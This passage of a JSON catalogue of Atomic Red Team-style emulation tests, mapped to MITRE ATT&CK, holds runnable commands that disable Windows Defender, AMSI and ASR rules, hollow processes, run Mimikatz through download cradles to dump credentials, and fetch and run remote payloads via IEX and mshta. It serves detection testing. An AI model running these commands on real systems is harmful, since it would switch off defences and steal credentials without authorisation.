-Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0 \n",
			"cleanup_command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1 \n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "ESXi - Disable Account Lockout Policy via PowerCLI",
		"auto_generated_guid": "091a6290-cd29-41cb-81ea-b12f133c66cb",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
				"prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
				"get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
			}
		],
		"executor": {
			"command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete Microsoft Defender ASR Rules - InTune",
		"auto_generated_guid": "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager\"\n\nif (-not (Test-Path $registryPath)) {\n  New-Item -Path $registryPath -Force\n  Write-Host \"Registry key created: $registryPath\"\n}\n\n$registryValueName = \"ASRRules\"\n\nif (Test-Path \"$registryPath\\$registryValueName\") {\n  Remove-ItemProperty -Path $registryPath -Name $registryValueName\n  Write-Host \"Registry value deleted: $registryValueName\"\n} else {\n  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value \"36190899-1602-49e8-8b27-eb1d0a1ce869=1\" -Force\n  Write-Host \"Registry value created: $registryValueName\"\n}\n\n\nRemove-ItemProperty -Path $registryPath -Name $registryValueName\nWrite-Host \"Registry value deleted: $registryValueName\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete Microsoft Defender ASR Rules - GPO",
		"auto_generated_guid": "0e7b8a4b-2ca5-4743-a9f9-96051abb6e50",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules\"\n\nif (-not (Test-Path $registryPath)) {\n    New-Item -Path $registryPath -Force\n    Write-Host \"Registry key created: $registryPath\"\n}\n\n$newValueName = \"36190899-1602-49e8-8b27-eb1d0a1ce869\"\n$newValueData = \"1\"\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\nWrite-Host \"Registry value created: $newValueName with data $newValueData\"\n\nRemove-ItemProperty -Path $registryPath -Name $newValueName\nWrite-Host \"Registry value deleted: $newValueName\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "AMSI Bypass - Create AMSIEnable Reg Key",
		"auto_generated_guid": "728eca7b-0444-4f6f-ac36-437e3d751dc0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
			"cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Recurse -Force 2> $null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Process Hollowing using PowerShell",
		"auto_generated_guid": "562427b4-39ef-4e8c-af88-463a78e70b9c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hollow_binary_path": {
				"description": "Path of the binary to hollow (executable that will run inside the sponsor)",
				"type": "string",
				"default": "C:\\Windows\\System32\\cmd.exe"
			},
			"parent_process_name": {
				"description": "Name of the parent process",
				"type": "string",
				"default": "explorer"
			},
			"sponsor_binary_path": {
				"description": "Path of the sponsor binary (executable that will host the binary)",
				"type": "string",
				"default": "C:\\Windows\\System32\\notepad.exe"
			},
			"spawnto_process_name": {
				"description": "Name of the process to spawn",
				"type": "string",
				"default": "notepad"
			}
		},
		"executor": {
			"command": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n",
			"cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055.012",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "RunPE via VBA",
		"auto_generated_guid": "3ad4a037-1598-4136-837c-4027e4fa319b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ms_product": {
				"description": "Maldoc application Word",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055.012",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Hollowing in Go using CreateProcessW WinAPI",
		"auto_generated_guid": "c8f98fe1-c89b-4c49-a7e3-d60ee4bc2f5a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hollow_binary_path": {
				"description": "Path of the binary to hollow",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"hollow_process_name": {
				"description": "Name of the process to hollow",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055.012",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)",
		"auto_generated_guid": "94903cc5-d462-498a-b919-b1e5ab155fee",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hollow_binary_path": {
				"description": "Path of the binary to hollow",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"hollow_process_name": {
				"description": "Name of the process to hollow",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{hollow_process_name}\" -ErrorAction SilentlyContinue"
		},
		"attack_technique": "T1055.012",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Connection Proxy",
		"auto_generated_guid": "0ac21132-4485-4212-a681-349e8a6637cd",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"proxy_server": {
				"description": "Proxy server URL",
				"type": "url",
				"default": "127.0.0.1"
			},
			"proxy_port": {
				"description": "Proxy server port",
				"type": "integer",
				"default": 8080
			},
			"proxy_scheme": {
				"description": "Protocol to proxy (http or https)",
				"type": "string",
				"default": "http"
			}
		},
		"executor": {
			"command": "export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port}\n",
			"cleanup_command": "unset http_proxy\nunset https_proxy\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1090.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Connection Proxy for macOS UI",
		"auto_generated_guid": "648d68c1-8bcd-4486-9abe-71c6655b6a2c",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"proxy_server": {
				"description": "Proxy server URL (host)",
				"type": "url",
				"default": "127.0.0.1"
			},
			"proxy_port": {
				"description": "Proxy server port",
				"type": "integer",
				"default": 8080
			},
			"interface": {
				"description": "Protocol to proxy (http or https)",
				"type": "string",
				"default": "Wi-Fi"
			}
		},
		"executor": {
			"name": "sh",
			"command": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n",
			"cleanup_command": "networksetup -setwebproxystate #{interface} off\nnetworksetup -setsecurewebproxystate #{interface} off\n",
			"elevation_required": false
		},
		"attack_technique": "T1090.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "portproxy reg key",
		"auto_generated_guid": "b8223ea9-4be2-44a6-b50a-9657a3d4e72a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"connectaddress": {
				"description": "Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.",
				"type": "string",
				"default": "127.0.0.1"
			},
			"connectport": {
				"description": "Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.",
				"type": "string",
				"default": "1337"
			},
			"listenport": {
				"description": "Specifies the IPv4 port, by port number or service name, on which to listen.",
				"type": "string",
				"default": "1337"
			}
		},
		"executor": {
			"command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}",
			"cleanup_command": "netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1090.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Office Application Startup - Outlook as a C2",
		"auto_generated_guid": "bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /f >nul 2>&1\ndel %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1137",
		"phases": ["persistence"]
	},
	{
		"name": "Staging Local Certificates via Export-Certificate",
		"auto_generated_guid": "eb121494-82d1-4148-9e2b-e624e03fbf3d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n",
			"cleanup_command": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1649",
		"phases": ["credential-access"]
	},
	{
		"name": "Deploy Docker container",
		"auto_generated_guid": "59aa6f26-7620-417e-9318-589e0fb7a372",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker  --no-pager\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			}
		],
		"executor": {
			"command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n",
			"name": "bash",
			"cleanup_command": "docker stop t1610_container\ndocker rmi -f t1610:latest \n",
			"elevation_required": false
		},
		"attack_technique": "T1610",
		"phases": ["defense-evasion", "execution"]
	},
	{
		"name": "Trap EXIT",
		"auto_generated_guid": "a74b2e07-5952-4c03-8b56-56274b076b61",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
			"cleanup_command": "rm -f /tmp/art-fish.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Trap EXIT (freebsd)",
		"auto_generated_guid": "be1a5d70-6865-44aa-ab50-42244c9fd16f",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if bash is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y bash)\n"
			}
		],
		"executor": {
			"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'\n",
			"cleanup_command": "rm -f /tmp/art-fish.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Trap SIGINT",
		"auto_generated_guid": "a547d1ba-1d7a-4cc5-a9cb-8d65e8809636",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
			"cleanup_command": "rm -f /tmp/art-fish.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Trap SIGINT (freebsd)",
		"auto_generated_guid": "ade10242-1eac-43df-8412-be0d4c704ada",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if bash is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v bash)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y bash)\n"
			}
		],
		"executor": {
			"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'\n",
			"cleanup_command": "rm -f /tmp/art-fish.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1546.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Control Panel Items",
		"auto_generated_guid": "037e9d8a-9e46-4255-8b33-2ae3b545ca6f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"cpl_file_path": {
				"description": "path to cpl file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.002\\bin\\calc.cpl"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Cpl file must exist on disk at specified location (#{cpl_file_path})\n",
				"prereq_command": "if (Test-Path \"#{cpl_file_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{cpl_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl\" -OutFile \"#{cpl_file_path}\"\n"
			}
		],
		"executor": {
			"command": "control.exe \"#{cpl_file_path}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mimikatz",
		"auto_generated_guid": "f3132740-55bc-48c4-bcc0-758a459cd027",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mimurl": {
				"description": "Mimikatz url",
				"type": "url",
				"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
			}
		},
		"executor": {
			"command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Run BloodHound from local disk",
		"auto_generated_guid": "a21bb23e-e677-4ee7-af90-6931b57b6350",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "SharpHound.ps1 must be located at \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n"
			}
		],
		"executor": {
			"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n",
			"cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Run Bloodhound from Memory using Download Cradle",
		"auto_generated_guid": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
			"cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Mimikatz - Cradlecraft PsSendKeys",
		"auto_generated_guid": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Invoke-AppPathBypass",
		"auto_generated_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Powershell MsXml COM object - with prompt",
		"auto_generated_guid": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "url of payload to execute",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"
			}
		},
		"executor": {
			"command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Powershell XML requests",
		"auto_generated_guid": "4396927f-e503-427b-b023-31049b9b09a6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "url of payload to execute",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml"
			}
		},
		"executor": {
			"command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Powershell invoke mshta.exe download",
		"auto_generated_guid": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"url": {
				"description": "url of payload to execute",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"
			}
		},
		"executor": {
			"command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "Powershell Invoke-DownloadCradle",
		"auto_generated_guid": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7",
		"supported_platforms": ["windows"],
		"executor": {
			"steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1059.001",
		"phases": ["execution"]
	},
	{
		"name": "PowerShell Fileless Script Execution",
		"auto_generated_guid": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
		"supported_platforms": ["windows"],
		"executor": {
